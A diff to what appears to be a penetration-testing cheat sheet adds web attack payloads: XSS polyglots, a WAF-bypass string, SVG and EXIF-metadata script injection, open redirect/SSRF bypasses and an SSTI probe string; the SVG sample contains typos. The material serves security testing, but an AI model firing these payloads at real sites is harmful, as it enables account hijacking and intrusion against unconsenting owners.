@@ -566,11 +566,12 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
    
 	
-<h2 align='center' id='n2'><em> Payloads </em></h2>
-<li> <a href='#n2.1'> LFI Linux and Windwos Payloads</a>
-<li> <a href='#n2.2'> XSS Payloads</a>
-<li> <a href='#n2.3'> CSRF</a>
-<li> <a href='#n2.4'> Chains</a>
+<h2 align='center' id='n2'><em>Payloads</em></h2>
+<li><a href='#n2.1'>LFI Linux and Windwos Payloads</a>
+<li><a href='#n2.2'>XSS Payloads</a>
+<li><a href='#n2.3'>CSRF</a>
+<li><a href='#n2.4'>Chains</a>
+<li><a href='#n2.5'>Server Side Template Injection</a>
     <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
  	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
@@ -603,10 +604,24 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	      	<p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
 	    	<p><b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
 	      	<p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
-	    <li> XSS Bypass WAF:
+	    <li>XSS Bypass WAF:
 		    <pre><code>&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//</code></pre>
-	    <li> Try to download to bypass shielding file with name like:
+	    <li>Try to download to bypass shielding file with name like:
 		    <pre><code>&lt;img src=1 onerror=alert()>.png</code></pre>
+	    <li>XSS through SVG file:
+		    <pre><code>
+&lt;?xml verion="1.0" standalone="no"?>
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+&lt;svg version="1.1" baseProfile="full" xmlns=""www.w3.org/2000/svg">
+&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+&lt;script type="text/javascript">
+	alert(document.domain);
+&lt;/script>
+&lt;/svg>
+		    </code></pre>
+	    <li>XSS through metadata
+		    <p>Set header to <code>Content-Type: text/html</code>
+		    <pre><code>exiftool file.jpeg -Comment='&lt;script>alert(1)&lt;/script>'</code></pre>
 	    <li>Tips for exploit:
 		    <ul>
 			    <li>try to upload a file (image, svg, html) that contains xss payload inside
@@ -637,6 +652,12 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	<li>Redirect bypasses for Open Redirect & SSRF!
  		<pre><code>?u=example2\.com  ❎
 ?u=example\.com@example2\.com ✅</code></pre>
+
+<h3 id='n2.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SSTI </h3>
+<ul>
+	<li>Polyglot:
+		<pre><code>${{&lt;%[%'"}}%\</code></pre>
+</ul>
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
 	      
